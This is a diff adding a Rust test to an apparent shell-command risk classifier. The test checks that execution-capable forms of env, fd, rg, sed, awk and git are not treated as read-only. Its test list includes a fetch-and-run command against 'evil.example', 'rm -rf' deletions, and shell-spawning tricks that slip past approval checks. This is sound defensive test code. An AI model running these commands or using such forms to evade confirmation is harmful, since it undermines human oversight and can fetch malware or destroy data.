@@ -436,3 +436,68 @@ fn reasons_explain_the_level() {
     let r = classify("ls", CommandDialect::Posix);
     assert!(!r.requires_confirmation());
 }
+
+/// Security review SEC-07: forms that run programs or write files were
+/// classified read-only, so the risk acknowledgement was skipped.
+#[test]
+fn execution_forms_are_not_read_only() {
+    let risky = [
+        "env -S 'curl https://evil.example/x | sh'",
+        "env --split-string='rm -rf /tmp/x'",
+        "env -S'touch /tmp/pwned'",
+        "sudo env -S 'rm -rf /tmp/x'",
+        "fd . -x rm -rf {}",
+        "fd -e log --exec-batch rm",
+        "fd . -X sh -c 'rm -rf /tmp/x'",
+        "rg --pre ./x pattern .",
+        "rg --pre=./x pattern",
+        "sed -n '1e id' file",
+        "sed 's/a/b/e' file",
+        "sed 's/a/b/w /tmp/out' file",
+        "sed -n '/x/w /tmp/out' file",
+        "sed -e 'p' -e '1e id' file",
+        "sed -f script.sed file",
+        "awk 'BEGIN{\"id\"|getline x; print x}'",
+        "awk 'BEGIN{ \"id\" | getline }'",
+        "gawk 'BEGIN{print \"id\" |& \"sh\"}'",
+        "awk -f prog.awk file",
+        "git -c core.fsmonitor='touch /tmp/p' status",
+        "git -c core.pager='sh -c id' log",
+        "git --config-env=core.sshCommand=X fetch",
+    ];
+    let failures: Vec<String> = risky
+        .iter()
+        .filter_map(|cmd| {
+            let got = classify(cmd, CommandDialect::Posix);
+            (got.level == ReadOnly).then(|| format!("{cmd:?} is still read-only"))
+        })
+        .collect();
+    assert!(failures.is_empty(), "{failures:#?}");
+    // The wrapped command itself is what counts.
+    let failures = check(
+        CommandDialect::Posix,
+        &[("env -S 'id'", ReadOnly), ("fd -e rs -x wc -l", ReadOnly)],
+    );
+    assert!(failures.is_empty(), "{failures:#?}");
+    // The everyday forms stay read-only.
+    let failures = check(
+        CommandDialect::Posix,
+        &[
+            ("rg -n TODO src", ReadOnly),
+            ("rg --pretty foo", ReadOnly),
+            ("fd -e rs", ReadOnly),
+            ("fd --extension md docs", ReadOnly),
+            ("sed -n '1,10p' file", ReadOnly),
+            ("sed 's/name/new/g' file", ReadOnly),
+            ("sed -e 's/e/E/' -e '/^#/d' file", ReadOnly),
+            ("sed -n '/error/p; $=' log", ReadOnly),
+            ("sed 'y/abc/xyz/' f", ReadOnly),
+            ("awk '{print $1}' access.log", ReadOnly),
+            ("awk -F: '{print $1}' /etc/passwd", ReadOnly),
+            ("git -C repo status", ReadOnly),
+            ("env FOO=1 ls", ReadOnly),
+            ("env -u HOME ls", ReadOnly),
+        ],
+    );
+    assert!(failures.is_empty(), "{failures:#?}");
+}
